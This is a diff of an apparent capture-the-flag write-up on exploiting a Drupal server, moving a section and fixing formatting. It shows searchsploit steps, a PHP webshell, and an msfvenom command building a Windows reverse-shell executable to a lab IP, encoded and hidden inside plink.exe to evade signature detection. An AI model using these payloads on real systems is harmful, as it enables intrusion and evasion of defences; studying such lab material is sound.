@@ -72,7 +72,7 @@ It  informs us that the exact version of drupal is
 
 Armed with this I look at the searchsploit results again, and see that the options are reduced.
 
-I copied the `Drupal services module RCE` and the `Drupalgeddon3 RCE PoC (not metasploit version) to my working folder and had a read.
+I copied the `Drupal services module RCE` and the `Drupalgeddon3 RCE PoC` (not metasploit version) to my working folder and had a read.
 
 `searchsploit -m 41564`
 `searchsploit -m 44542`
@@ -86,15 +86,6 @@ I copied the `Drupal services module RCE` and the `Drupalgeddon3 RCE PoC (not me
 
 <hr width="250" size="6">
 
-
-I use msfvenom to craft a payload, I chose a 'known' port thats usually deemed 'safe', but is not in use, I also encrypt it with `shikata_ga_nai` and embed it into a 'safe' binary called `plink.exe`;
-hopefully any defences looking for a suspicious signature will not be alerted.
-
-```
-
-msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.16 lport=443 -f exe -e x86/shikata_ga_nai -x /usr/share/windows-binaries/plink.exe -o evil.exe
-
-```
 
 I decided to have a go at the drupal services module RCE exploit; it requires modifying, I need to find the rest endpoint.
 
@@ -110,6 +101,21 @@ So I'm able to modify the exploit accordingly
 I changed the php payload to a webshell, that's executable from the created page sh1n0bi.php.
 
 Rather than upload the evil.exe I can serve it to the target with Impacket's smbserver.py
+
+
+
+
+<h4>msfvenom</h4>
+I use msfvenom to craft a payload, I chose a 'known' port thats usually deemed 'safe', but is not in use, I also encrypt it with `shikata_ga_nai` and embed it into a 'safe' binary called `plink.exe`;
+hopefully any defences looking for a suspicious signature will not be alerted.
+
+```
+
+msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.16 lport=443 -f exe -e x86/shikata_ga_nai -x /usr/share/windows-binaries/plink.exe -o evil.exe
+
+```
+
+
 
 
 First we have to run smbserver.py and share the folder containing evil.exe.
